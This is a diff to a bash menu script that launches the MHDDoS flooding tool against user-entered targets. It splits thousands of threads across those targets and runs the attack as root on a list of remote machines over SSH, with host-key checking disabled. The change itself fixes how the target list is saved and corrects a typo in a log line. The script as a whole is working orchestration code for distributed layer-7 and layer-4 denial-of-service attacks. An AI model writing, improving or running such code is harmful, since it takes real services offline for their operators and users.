@@ -4,7 +4,8 @@ case $MENU_OPTION in
 
 1)
     ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")
-    dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70 > "$SCRIPT_DIR/targets.txt"
+    targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
+    printf "$targets" > "$SCRIPT_DIR/targets.txt"
     targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
     threads=$(( 2000 / targets_num ))
     SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
@@ -17,7 +18,7 @@ case $MENU_OPTION in
     while read -r target; do
       echo "TARGET: $target"
       echo "THREADS: $threads"
-      echo "COMMEND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
+      echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
       bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $SOCKS_TYPE $threads $PROXY_FILE $RPS $DURATION" \
        --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
     done < "$SCRIPT_DIR/targets.txt"
@@ -26,7 +27,8 @@ case $MENU_OPTION in
 
 2)
     ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")
-    dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70 > "$SCRIPT_DIR/targets.txt"
+    targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
+    printf "$targets" > "$SCRIPT_DIR/targets.txt"
     targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
     threads=$(( 2000 / targets_num ))
 
@@ -39,7 +41,7 @@ case $MENU_OPTION in
     while read -r target; do
       echo "TARGET: $target"
       echo "THREADS: $threads"
-      echo "COMMEND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
+      echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
       bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" \
        --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
     done < "$SCRIPT_DIR/targets.txt"
